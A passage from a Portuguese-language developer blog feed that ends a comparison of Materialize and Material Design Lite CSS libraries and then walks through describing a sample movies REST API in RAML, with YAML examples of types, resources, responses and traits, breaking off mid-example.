  &lt;a href="https://github.com/dogfalo/materialize/" title="Veja o repositório"&gt;&lt;em&gt;Github&lt;/em&gt;&lt;/a&gt;. Possui como dependência o &lt;em&gt;jQuery&lt;/em&gt;,
  tornando-a uma opção ligeiramente "pesada". Possui uma documentação fácil de ler, mas
  infelizmente o seu &lt;em&gt;showcase&lt;/em&gt; está desatualizado.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;MDL&lt;/strong&gt;: A biblioteca "oficial" da &lt;em&gt;Google&lt;/em&gt;. Também &lt;em&gt;open source&lt;/em&gt;, com cerca de 26 mil &lt;em&gt;stars&lt;/em&gt; no
  &lt;a href="https://github.com/google/material-design-lite"&gt;&lt;em&gt;Github&lt;/em&gt;&lt;/a&gt;, não possui dependência de outras bibliotecas e é
  declarada como opção mais fiel às especificações do &lt;em&gt;Material Design&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Não vou fazer uma análise profunda entre os dois, pois para ser sincero, só tive
um contato mais íntimo com o &lt;em&gt;MaterializeCSS&lt;/em&gt;. O que posso dizer é que ambos
cumprem bem a sua proposta (e possuem uma boa camada de customização através de &lt;a href="https://klauslaube.com.br/tag/sass.html" title="Leia mais sobre Sass"&gt;&lt;em&gt;Sass&lt;/em&gt;&lt;/a&gt;),
e (na minha opinião) a biblioteca do &lt;em&gt;Google&lt;/em&gt; leva certa vantagem por ser ligeiramente
mais leve, não ter o &lt;em&gt;jQuery&lt;/em&gt; como dependência, e ainda por cima usar
&lt;a href="http://getbem.com/" title="Saiba o que é o BEM e como ele pode te ajudar a escrever CSS"&gt;&lt;em&gt;BEM&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/batman-fear-face.jpg" width="610" height="407" title="Ao contrário do Batman, eu me rendi" alt="Ao contrário do Batman, eu me rendi"&gt;&lt;/p&gt;
&lt;p&gt;Em defesa do &lt;em&gt;Materialize&lt;/em&gt;, acho a curva de aprendizagem menor que a do concorrente,
e uma rápida leitura do seu &lt;em&gt;getting started&lt;/em&gt; já te dá conteúdo o suficiente para ter
as suas primeiras páginas escritas.&lt;/p&gt;
&lt;p&gt;Se você deseja uma análise mais completa, recomendo o &lt;a href="https://andreapaiola.name/2015-07-materialize-css-vs-material-design-lite/"&gt;&lt;em&gt;Google release Material Design Lite, time to switch?&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Acredito que ter qualquer uma das duas bibliotecas no seu &lt;em&gt;toolbox&lt;/em&gt; é recomendado, principalmente
se a sua solução for flertar com o ambiente &lt;em&gt;Mobile&lt;/em&gt;. Então, no seu próximo projeto, antes
de ir "por padrão" no &lt;em&gt;Bootstrap&lt;/em&gt; ou &lt;em&gt;Foundation&lt;/em&gt;, dê uma chance ao &lt;em&gt;Material&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Se você estiver usando &lt;em&gt;React&lt;/em&gt;, o &lt;a href="http://www.material-ui.com/"&gt;&lt;em&gt;Material-UI&lt;/em&gt;&lt;/a&gt; pode
ser uma boa pedida. Para a galera do &lt;em&gt;Angular&lt;/em&gt;, existe o &lt;a href="https://material.angular.io/"&gt;&lt;em&gt;Angular Material&lt;/em&gt;&lt;/a&gt;
que cumpre bem o seu papel. O &lt;em&gt;Vue&lt;/em&gt; não fica de fora com o &lt;a href="https://vuematerial.github.io/"&gt;&lt;em&gt;Vue Material&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://material.io/"&gt;&lt;em&gt;Material Design.io&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://getmdl.io/"&gt;&lt;em&gt;Material Design Lite&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://materializecss.com/"&gt;&lt;em&gt;Materialize&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.myway.com.br/material-design-o-que-e-e-sua-aplicacao/"&gt;&lt;em&gt;MyWay&lt;/em&gt; - &lt;em&gt;Material Design&lt;/em&gt;: O que é e sua aplicação&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.wikipedia.org/wiki/Material_Design"&gt;&lt;em&gt;Wikipedia&lt;/em&gt; - &lt;em&gt;Material Design&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="mobile"></category><category term="android"></category><category term="css"></category><category term="material-design"></category><category term="materializecss"></category><category term="material-design-lite"></category><category term="eu-me-rendo"></category></entry><entry><title>Ramilificando as suas APIs</title><link href="https://klauslaube.com.br/2017/01/31/ramilificando-as-suas-apis.html" rel="alternate"></link><published>2017-01-31T21:30:00-02:00</published><updated>2017-01-31T21:30:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-01-31:/2017/01/31/ramilificando-as-suas-apis.html</id><summary type="html">&lt;p&gt;Você já tem a sua &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre APIs"&gt;&lt;em&gt;API&lt;/em&gt;&lt;/a&gt;! Ela é &lt;a href="https://klauslaube.com.br/tag/rest.html" title="Leia mais sobre REST"&gt;&lt;em&gt;REST&lt;/em&gt;&lt;/a&gt;,
performa muito bem, e todos os seus aplicativos estão
conversando com a mesma. Vem uma oportunidade de negócio de abrí-la para consumo
de parceiros. Agora não basta só a técnica perfeita, você precisa de especificação, documentações,
exemplos de uso e validadores …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Você já tem a sua &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre APIs"&gt;&lt;em&gt;API&lt;/em&gt;&lt;/a&gt;! Ela é &lt;a href="https://klauslaube.com.br/tag/rest.html" title="Leia mais sobre REST"&gt;&lt;em&gt;REST&lt;/em&gt;&lt;/a&gt;,
performa muito bem, e todos os seus aplicativos estão
conversando com a mesma. Vem uma oportunidade de negócio de abrí-la para consumo
de parceiros. Agora não basta só a técnica perfeita, você precisa de especificação, documentações,
exemplos de uso e validadores para garantir que os contratos da sua &lt;em&gt;API&lt;/em&gt; não sofram alterações drásticas,
deixando seu cliente na mão.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Essa é a realidade da &lt;a href="http://loadsmart.com" title="Book a truck with Loadsmart"&gt;&lt;em&gt;Loadsmart&lt;/em&gt;&lt;/a&gt; no momento da
publicação desse &lt;em&gt;post&lt;/em&gt;. Lá, optamos por seguir os mesmos passos do &lt;a href="http://spotify.com" title="Você já sabe o que é isso :)"&gt;&lt;em&gt;Spotify&lt;/em&gt;&lt;/a&gt;
e utilizar o &lt;em&gt;RAML&lt;/em&gt; para descrever as nossas &lt;em&gt;APIs&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;RAML é quase YAML&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;RAML&lt;/em&gt; (RESTful API Modeling Language) é uma maneira simples
de descrever/projetar suas &lt;em&gt;APIs&lt;/em&gt;. Através de uma linguagem concisa, baseada
em YAML, você é capaz de escrever especificações que podem ser usadas como
documentação, ferramenta de &lt;em&gt;build&lt;/em&gt; e de testes automatizados.&lt;/p&gt;
&lt;p&gt;Ao invés de tentar cultivar a motivação para a utilização do &lt;em&gt;RAML&lt;/em&gt;, vou descrever
de forma prática os principais aspectos do padrão. Para tanto, já começo
recomendando a instalação do &lt;a href="http://apiworkbench.com/" title="IDE for designing APIs"&gt;&lt;em&gt;API Workbench&lt;/em&gt;&lt;/a&gt;,
um excelente &lt;em&gt;plugin&lt;/em&gt; para o &lt;em&gt;Atom&lt;/em&gt; que facilita (e muito) a escrita de documentos &lt;em&gt;RAML&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Como começar?&lt;/h2&gt;
&lt;p&gt;Vamos voltar ao nosso "mini IMDB", exemplo utilizado em &lt;a href="https://klauslaube.com.br/tag/rest.html" title="Veja os posts sobre REST"&gt;alguns &lt;em&gt;posts&lt;/em&gt;&lt;/a&gt; aqui do &lt;em&gt;blog&lt;/em&gt;.
Os principais &lt;em&gt;endpoints&lt;/em&gt; que temos são:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;GET /movies&lt;/code&gt;: Listagem de filmes;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;POST /movies&lt;/code&gt;: Adição de um filme;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GET /movies/{id}&lt;/code&gt;: Detalhes de um filme;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PUT /movies/{id}&lt;/code&gt;: Atualização de um filme;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DELETE /movies/{id}&lt;/code&gt;: Remoção de um filme.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Podemos começar criando um arquivo &lt;code&gt;api.raml&lt;/code&gt; com o seguinte conteúdo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#%RAML 1.0&lt;/span&gt;
&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Movies API&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No momento desse artigo, o &lt;em&gt;RAML&lt;/em&gt; possui duas especificações ativas: a &lt;code&gt;0.8&lt;/code&gt; e a &lt;code&gt;1.0&lt;/code&gt;. Dependendo
das ferramentas que você for utilizar posteriormente, talvez seja interessante optar pela especificação &lt;code&gt;0.8&lt;/code&gt;.
Nesse exemplo utilizaremos a &lt;code&gt;1.0&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Vamos continuar descrevendo a nossa &lt;em&gt;API&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#%RAML 1.0&lt;/span&gt;
&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Movies API&lt;/span&gt;
&lt;span class="nt"&gt;version&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;v1&lt;/span&gt;
&lt;span class="nt"&gt;baseUri&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;https://api.movies.com/{version}&lt;/span&gt;
&lt;span class="nt"&gt;mediaType&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;application/json&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Setamos a versão da &lt;em&gt;API&lt;/em&gt; como &lt;code&gt;v1&lt;/code&gt;, atendendo pelo endereço &lt;code&gt;https://api.movies.com/v1&lt;/code&gt;. Trabalharemos
com objetos &lt;em&gt;JSON&lt;/em&gt;. Caso a &lt;em&gt;API&lt;/em&gt; necessite trabalhar com mais de um tipo (&lt;em&gt;XML&lt;/em&gt;, por exemplo),
é possível declará-lo no &lt;code&gt;mediaType&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;mediaType&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;application/json&lt;/span&gt;&lt;span class="p p-Indicator"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;application/xml&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Descrevendo os dados&lt;/h2&gt;
&lt;p&gt;Se você optar pela versão &lt;code&gt;0.8&lt;/code&gt; do padrão, a palavra &lt;code&gt;schemas&lt;/code&gt; aparecerá com certa frequência durante
a construção do documento. Com a &lt;code&gt;1.0&lt;/code&gt;, a comunidade depreciou o termo em prol da palavra-chave &lt;code&gt;types&lt;/code&gt;, e é com
ela que descreveremos o tipo &lt;code&gt;Movie&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;types&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;Movie&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;properties&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
      &lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
      &lt;span class="l l-Scalar l-Scalar-Plain"&gt;description?&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;Movie&lt;/code&gt; possui três propriedades do tipo &lt;code&gt;string&lt;/code&gt;: &lt;code&gt;id&lt;/code&gt;, &lt;code&gt;title&lt;/code&gt; e &lt;code&gt;description&lt;/code&gt;. O &lt;code&gt;?&lt;/code&gt; em &lt;code&gt;description?&lt;/code&gt;
indica que essa última é uma propriedade opcional (ao contrário de &lt;code&gt;id&lt;/code&gt; e &lt;code&gt;title&lt;/code&gt; que são obrigatórias).&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;RAML&lt;/em&gt; suporta uma série de tipos &lt;em&gt;built-in&lt;/em&gt;, para saber mais, leia sobre &lt;a href="https://github.com/raml-org/raml-spec/blob/master/versions/raml-10/raml-10.md/#defining-types"&gt;definição de tipos&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Descrevendo os endpoints&lt;/h2&gt;
&lt;p&gt;Agora que temos um tipo definido, podemos partir para a descrição dos nossos &lt;em&gt;endpoints&lt;/em&gt;. Em &lt;em&gt;RAML&lt;/em&gt;,
a semântica correta é chamarmos um &lt;em&gt;endpoint&lt;/em&gt; de &lt;em&gt;Resource&lt;/em&gt;. Vamos iniciar pelo &lt;code&gt;/movies&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;/movies&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;A set of movies.&lt;/span&gt;

  &lt;span class="nt"&gt;get&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Get a list of movies.&lt;/span&gt;
    &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;200&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Movie[]&lt;/span&gt;
  &lt;span class="nt"&gt;post&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Add a new movie to the set.&lt;/span&gt;
    &lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Movie&lt;/span&gt;
    &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;201&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Returns the new movie.&lt;/span&gt;
        &lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Movie&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Começamos ao criar um bloco &lt;code&gt;/movies&lt;/code&gt;. Nele, além de adicionarmos uma descrição através da propriedade
&lt;code&gt;description&lt;/code&gt;, também deixamos explícito a possibilidade de enviarmos dois métodos: &lt;code&gt;get&lt;/code&gt; e &lt;code&gt;post&lt;/code&gt;.
Em &lt;code&gt;get&lt;/code&gt;, podemos ter como resposta um &lt;em&gt;status code&lt;/em&gt; &lt;code&gt;200&lt;/code&gt; e uma lista de &lt;code&gt;Movie&lt;/code&gt; (por isso o sufixo &lt;code&gt;[]&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Já em &lt;code&gt;post&lt;/code&gt;, além de deixar claro que retornaremos o objeto recém criado, apontamos que a resposta
será um &lt;code&gt;201&lt;/code&gt; com um único &lt;code&gt;Movie&lt;/code&gt;. Note que nesse caso descrevemos que o &lt;code&gt;post&lt;/code&gt; também possui um tipo,
através da palavra-chave &lt;code&gt;body&lt;/code&gt;. Isso quer dizer que, ao fazermos &lt;code&gt;POST /movies/&lt;/code&gt;, precisamos
passar um objeto que atenda as especificações do tipo &lt;code&gt;Movie&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/raml-vogons.jpg" width="640" height="432" title="RAML pode parecer poesia Vogon, mas não entre em pânico! (fundividedattention)" alt="RAML pode parecer poesia Vogon, mas não entre em pânico! (fundividedattention)"&gt;&lt;/p&gt;
&lt;p&gt;Caso a sua regra de negócio vá além da criação de um elemento, é possível descrevê-la
também. Por exemplo, vamos imaginar que exista a necessidade de verificar se o filme já existe no
banco de dados:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

      &lt;span class="l l-Scalar l-Scalar-Plain"&gt;201&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Returns the new movie.&lt;/span&gt;
        &lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Movie&lt;/span&gt;
&lt;span class=" -Error"&gt;      &lt;/span&gt;&lt;span class="nt"&gt;409&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;The movie already exists in our database.&lt;/span&gt;
        &lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;properties&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note que o padrão &lt;em&gt;RAML&lt;/em&gt; é flexível. Nesse caso não criamos um tipo &lt;code&gt;Error&lt;/code&gt;, apenas descrevemos o corpo
da resposta através das palavras-chave &lt;code&gt;body&lt;/code&gt; e &lt;code&gt;properties&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Vamos finalizar descrevendo os dois métodos restantes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;/{id}&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;uriParameters&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;The Movie identifier.&lt;/span&gt;
        &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;

    &lt;span class=" -Error"&gt; &lt;/span&gt;&lt;span class="nt"&gt;get&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
       &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Gets a specific movie.&lt;/span&gt;
       &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
         &lt;span class="nt"&gt;200&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
           &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Returns the specific movie.&lt;/span&gt;
           &lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Movie&lt;/span&gt;

    &lt;span class="nt"&gt;put&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Movie&lt;/span&gt;
      &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Updates an already created movie.&lt;/span&gt;
      &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;200&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Returns the updated movie.&lt;/span&gt;
          &lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Movie&lt;/span&gt;

    &lt;span class="nt"&gt;delete&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Deletes the movie.&lt;/span&gt;
      &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;204&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Confirms the deletion.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Dentro de &lt;code&gt;/movies&lt;/code&gt;, criamos um novo bloco chamado &lt;code&gt;/{id}&lt;/code&gt;. Através da propriedade &lt;code&gt;uriParameters&lt;/code&gt; deixamos
claro que &lt;code&gt;id&lt;/code&gt; é na verdade uma &lt;code&gt;string&lt;/code&gt; (no nosso caso, estamos usando um &lt;code&gt;uuid&lt;/code&gt;). Além disso, descrevemos
os métodos &lt;code&gt;get&lt;/code&gt;, &lt;code&gt;put&lt;/code&gt; e &lt;code&gt;delete&lt;/code&gt; para &lt;code&gt;/movies/{id}&lt;/code&gt;, que não diferem tanto assim dos demais explicados
anteriormente.&lt;/p&gt;
&lt;h2&gt;Descrevendo sem se repetir&lt;/h2&gt;
&lt;p&gt;No nosso &lt;a href="https://klauslaube.com.br/2017/01/06/construindo-apis-em-django-com-restless.html" title="Construindo APIs em Django com Restless"&gt;exemplo utilizando &lt;em&gt;Restless&lt;/em&gt;&lt;/a&gt;,
ao fazer um &lt;code&gt;POST&lt;/code&gt; ou &lt;code&gt;PUT&lt;/code&gt; com dados inválidos, retornamos um &lt;code&gt;BadRequest&lt;/code&gt;. Podemos especificar esse
comportamento para o recurso &lt;code&gt;POST movies/&lt;/code&gt; e &lt;code&gt;PUT movies/{id}&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Logo após o bloco &lt;code&gt;types&lt;/code&gt;, vamos adicionar um novo bloco chamado &lt;code&gt;traits&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;mediaType&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;application/json&lt;/span&gt;

&lt;span class="nt"&gt;types&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

&lt;span class="nt"&gt;traits&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;dataValidation&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;400&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;A BadRequest happens when data validation fails.&lt;/span&gt;
        &lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;properties&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Através de &lt;code&gt;traits&lt;/code&gt; somos capazes de escrever regras de uso que podem ser reaproveitadas por dados e recursos.
No exemplo acima, dizemos que recursos que utilizarem esse &lt;em&gt;trait&lt;/em&gt; terão como resposta o &lt;em&gt;status code&lt;/em&gt; &lt;code&gt;400&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Agora basta apontarmos nossos recursos ao &lt;em&gt;trait&lt;/em&gt; de nome &lt;code&gt;dataValidation&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;/movies&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;post&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;is&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;dataValidation&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;

&lt;span class=" -Error"&gt;  &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;/{id}&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;put&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
